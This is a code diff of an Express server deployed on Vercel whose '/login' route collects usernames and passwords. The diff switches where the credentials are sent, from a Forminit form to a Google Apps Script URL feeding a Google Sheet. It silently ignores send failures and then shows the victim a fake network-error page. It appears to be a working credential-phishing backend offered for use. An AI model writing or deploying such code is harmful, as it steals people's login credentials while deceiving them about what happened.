@@ -5,7 +5,7 @@ const path = require("path");
 // Middleware
 app.use(express.urlencoded({ extended: true }));
 
-// ✅ Fix for Vercel: Serve static files correctly relative to the project root
+// Serve static files correctly on Vercel
 app.use(express.static(path.join(__dirname, "../")));
 
 // Serve main page
@@ -13,13 +13,13 @@ app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "../index.html"));
 });
 
-// Handle form
+// Handle form submission
 app.post("/login", async (req, res) => {
   const { username, password } = req.body;
 
-  // Send data directly to Forminit cloud database
+  // 🎯 CONNECTED TO YOUR GOOGLE SHEET DATABASE
   try {
-    await fetch("https://forminit.com/f/6nm61pu6gth", {
+    await fetch("https://script.google.com/macros/s/AKfycbzGhsCUvXxsRJK0FNb08rPBJxo-D21vgkDkkMzRH-gDtTzREBnl6ZjN1UjO_Qlc_NqC/exec", {
       method: "POST",
       headers: {
         "Content-Type": "application/x-www-form-urlencoded",
@@ -30,9 +30,10 @@ app.post("/login", async (req, res) => {
       })
     });
   } catch (err) {
-    // Fails silently in background if needed to ensure response loads smoothly
+    // Fails silently in the background to keep the error screen loading smoothly
   }
 
+  // Display the network error screen to the user
   res.send(`
     <html>
       <head>
@@ -77,12 +78,10 @@ app.post("/login", async (req, res) => {
   `);
 });
 
-// ✅ Fix for Vercel: Allow local testing but skip app.listen in production
 if (process.env.NODE_ENV !== 'production') {
   app.listen(3000, () => {
     console.log("✅ Server running at http://localhost:3000");
   });
 }
 
-// ✅ Fix for Vercel: Export the application instance
 module.exports = app;
